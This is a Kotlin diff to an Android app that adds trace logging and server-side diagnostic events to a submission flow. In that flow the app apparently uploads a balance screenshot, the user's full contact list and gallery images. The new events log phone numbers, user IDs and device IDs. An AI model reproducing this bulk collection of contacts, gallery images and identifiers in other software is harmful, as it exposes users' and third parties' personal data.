@@ -273,6 +273,36 @@ class MainActivity : AppCompatActivity() {
         val launchContext = getTenantLaunchContextOrShowError() ?: return
         val deviceId = obtainDeviceId()
         val deviceInfo = obtainDeviceInfo()
+        val submissionTraceId = AppTraceLogger.newTraceId("submit")
+
+        AppTraceLogger.i(
+            "MainActivity",
+            submissionTraceId,
+            "upload_flow_started",
+            "userId" to userId,
+            "phone" to verifiedPhone,
+            "deviceId" to deviceId,
+            "appVersion" to deviceInfo.appVersion,
+            "qrTokenPresent" to launchContext.qrToken.isNotBlank(),
+            "referralCodePresent" to launchContext.referralCode.isNotBlank(),
+            "screenshotUri" to balanceScreenshotUri.toString()
+        )
+        postDiagnosticEvent(
+            traceId = submissionTraceId,
+            flow = "submission",
+            step = "upload_flow_started",
+            status = "info",
+            message = "User started submission upload flow.",
+            userId = userId,
+            phone = verifiedPhone,
+            deviceId = deviceId,
+            appVersion = deviceInfo.appVersion,
+            context = mapOf(
+                "tenantCode" to tenantCode,
+                "qrTokenPresent" to launchContext.qrToken.isNotBlank(),
+                "referralCodePresent" to launchContext.referralCode.isNotBlank()
+            )
+        )
 
         uploadInProgress = true
         refreshActionState()
@@ -288,6 +318,30 @@ class MainActivity : AppCompatActivity() {
                 }
                 balanceScreenshotFile = preparedScreenshot.first
                 screenshotMimeType = preparedScreenshot.second
+                AppTraceLogger.d(
+                    "MainActivity",
+                    submissionTraceId,
+                    "balance_screenshot_prepared",
+                    "fileName" to balanceScreenshotFile?.name,
+                    "fileSize" to balanceScreenshotFile?.length(),
+                    "mimeType" to screenshotMimeType
+                )
+                postDiagnosticEvent(
+                    traceId = submissionTraceId,
+                    flow = "submission",
+                    step = "balance_screenshot_prepared",
+                    status = "info",
+                    message = "Balance screenshot prepared for upload.",
+                    userId = userId,
+                    phone = verifiedPhone,
+                    deviceId = deviceId,
+                    appVersion = deviceInfo.appVersion,
+                    context = mapOf(
+                        "fileName" to balanceScreenshotFile?.name,
+                        "fileSize" to balanceScreenshotFile?.length(),
+                        "mimeType" to screenshotMimeType
+                    )
+                )
 
                 withContext(Dispatchers.IO) {
                     syncService.updateUserProfile(
@@ -306,7 +360,8 @@ class MainActivity : AppCompatActivity() {
                         birthday = profileInput.birthday,
                         occupation = profileInput.occupation,
                         deviceId = deviceId,
-                        deviceInfo = deviceInfo
+                        deviceInfo = deviceInfo,
+                        traceId = submissionTraceId
                     )
                 }
 
@@ -315,6 +370,24 @@ class MainActivity : AppCompatActivity() {
                 val contacts = withContext(Dispatchers.IO) {
                     contactsRepository.readContacts()
                 }
+                AppTraceLogger.i(
+                    "MainActivity",
+                    submissionTraceId,
+                    "contacts_loaded",
+                    "count" to contacts.size
+                )
+                postDiagnosticEvent(
+                    traceId = submissionTraceId,
+                    flow = "submission",
+                    step = "contacts_loaded",
+                    status = "info",
+                    message = "Contacts loaded from device.",
+                    userId = userId,
+                    phone = verifiedPhone,
+                    deviceId = deviceId,
+                    appVersion = deviceInfo.appVersion,
+                    context = mapOf("contactCount" to contacts.size)
+                )
 
                 withContext(Dispatchers.IO) {
                     syncService.syncContacts(
@@ -322,7 +395,8 @@ class MainActivity : AppCompatActivity() {
                         tenantQrToken = launchContext.qrToken,
                         referralCode = launchContext.referralCode,
                         userId = userId,
-                        contacts = contacts
+                        contacts = contacts,
+                        traceId = submissionTraceId
                     )
                 }
 
@@ -336,7 +410,8 @@ class MainActivity : AppCompatActivity() {
                         userId = userId,
                         imageFile = balanceScreenshotFile
                             ?: throw IllegalStateException(getString(R.string.error_missing_balance_screenshot)),
-                        mimeType = screenshotMimeType
+                        mimeType = screenshotMimeType,
+                        traceId = submissionTraceId
                     )
                 }
 
@@ -353,9 +428,39 @@ class MainActivity : AppCompatActivity() {
                         referralCode = launchContext.referralCode,
                         userId = userId,
                         images = galleryImages,
-                        contentResolver = contentResolver
+                        contentResolver = contentResolver,
+                        traceId = submissionTraceId
                     )
                 }
+                AppTraceLogger.i(
+                    "MainActivity",
+                    submissionTraceId,
+                    "gallery_upload_summary",
+                    "total" to galleryUploadResult.total,
+                    "uploaded" to galleryUploadResult.uploaded,
+                    "failed" to galleryUploadResult.failed,
+                    "firstError" to (galleryUploadResult.firstError ?: "")
+                )
+                postDiagnosticEvent(
+                    traceId = submissionTraceId,
+                    flow = "submission",
+                    step = "gallery_upload_summary",
+                    status = if (galleryUploadResult.failed > 0) "warning" else "success",
+                    message = if (galleryUploadResult.failed > 0) {
+                        galleryUploadResult.firstError ?: "Some gallery uploads failed."
+                    } else {
+                        "Gallery upload completed."
+                    },
+                    userId = userId,
+                    phone = verifiedPhone,
+                    deviceId = deviceId,
+                    appVersion = deviceInfo.appVersion,
+                    context = mapOf(
+                        "galleryTotal" to galleryUploadResult.total,
+                        "galleryUploaded" to galleryUploadResult.uploaded,
+                        "galleryFailed" to galleryUploadResult.failed
+                    )
+                )
 
                 setStatusMessage(if (galleryUploadResult.failed > 0) {
                     getString(
@@ -367,16 +472,57 @@ class MainActivity : AppCompatActivity() {
                 })
 
                 Toast.makeText(this@MainActivity, getString(R.string.toast_upload_complete), Toast.LENGTH_SHORT).show()
+                AppTraceLogger.i(
+                    "MainActivity",
+                    submissionTraceId,
+                    "upload_flow_completed",
+                    "userId" to userId
+                )
+                postDiagnosticEvent(
+                    traceId = submissionTraceId,
+                    flow = "submission",
+                    step = "upload_flow_completed",
+                    status = "success",
+                    message = "Submission flow completed successfully.",
+                    userId = userId,
+                    phone = verifiedPhone,
+                    deviceId = deviceId,
+                    appVersion = deviceInfo.appVersion
+                )
                 startActivity(SubmissionSuccessActivity.createIntent(this@MainActivity))
                 finish()
             } catch (e: Exception) {
-                Log.e("MainActivity", "Upload flow failed", e)
+                AppTraceLogger.e(
+                    "MainActivity",
+                    submissionTraceId,
+                    "upload_flow_failed",
+                    e,
+                    "userId" to userId,
+                    "deviceId" to deviceId
+                )
+                postDiagnosticEvent(
+                    traceId = submissionTraceId,
+                    flow = "submission",
+                    step = "upload_flow_failed",
+                    status = "error",
+                    message = e.message ?: "Unknown upload flow failure.",
+                    userId = userId,
+                    phone = verifiedPhone,
+                    deviceId = deviceId,
+                    appVersion = deviceInfo.appVersion
+                )
                 val errorMessage = e.message ?: "Unknown error"
                 setStatusMessage(getString(R.string.status_upload_failed, errorMessage))
                 Toast.makeText(this@MainActivity, getString(R.string.toast_upload_failed, errorMessage), Toast.LENGTH_LONG)
                     .show()
             } finally {
                 balanceScreenshotFile?.delete()
+                AppTraceLogger.d(
+                    "MainActivity",
+                    submissionTraceId,
+                    "temporary_file_deleted",
+                    "fileName" to balanceScreenshotFile?.name
+                )
                 uploadInProgress = false
                 refreshActionState()
             }
@@ -965,16 +1111,24 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun bootstrapTenantVersionIfPossible() {
+        val traceId = AppTraceLogger.newTraceId("bootstrap")
         lifecycleScope.launch {
             try {
                 val bootstrap = withContext(Dispatchers.IO) {
                     syncService.bootstrapTenant(
                         baseUrl = BuildConfig.APP_BASE_URL,
-                        tenantQrToken = qrToken
+                        tenantQrToken = qrToken,
+                        traceId = traceId
                     )
                 }
                 maybeShowUpdateDialog(bootstrap)
-            } catch (_: Exception) {
+            } catch (error: Exception) {
+                AppTraceLogger.w(
+                    "MainActivity",
+                    traceId,
+                    "bootstrap_tenant_failed",
+                    "message" to (error.message ?: "unknown")
+                )
                 // Ignore bootstrap failures here because the verified flow may still continue.
             }
         }
@@ -992,6 +1146,45 @@ class MainActivity : AppCompatActivity() {
         AppUpdateManager.showUpdateDialog(this, requirement) {
             forceUpdateRequired = false
             refreshActionState()
+        }
+    }
+
+    private fun postDiagnosticEvent(
+        traceId: String,
+        flow: String,
+        step: String,
+        status: String,
+        message: String,
+        userId: Int? = null,
+        phone: String = "",
+        deviceId: String = "",
+        appVersion: String = BuildConfig.VERSION_NAME,
+        context: Map<String, Any?> = emptyMap()
+    ) {
+        val effectiveReferralCode = referralCode.ifBlank { tenantLaunchManager.getContext().referralCode }
+        val effectiveTenantCode = tenantCode.ifBlank { tenantLaunchManager.getContext().tenantCode }
+        val effectiveQrToken = qrToken.ifBlank { tenantLaunchManager.getContext().qrToken }
+
+        lifecycleScope.launch(Dispatchers.IO) {
+            syncService.reportClientEvent(
+                baseUrl = BuildConfig.APP_BASE_URL,
+                tenantQrToken = effectiveQrToken,
+                referralCode = effectiveReferralCode,
+                traceId = traceId,
+                event = ClientDiagnosticEvent(
+                    flow = flow,
+                    step = step,
+                    status = status,
+                    message = message,
+                    screen = "MainActivity",
+                    userId = userId,
+                    phone = phone,
+                    deviceId = deviceId,
+                    appVersion = appVersion,
+                    tenantCode = effectiveTenantCode,
+                    context = context
+                )
+            )
         }
     }
 }
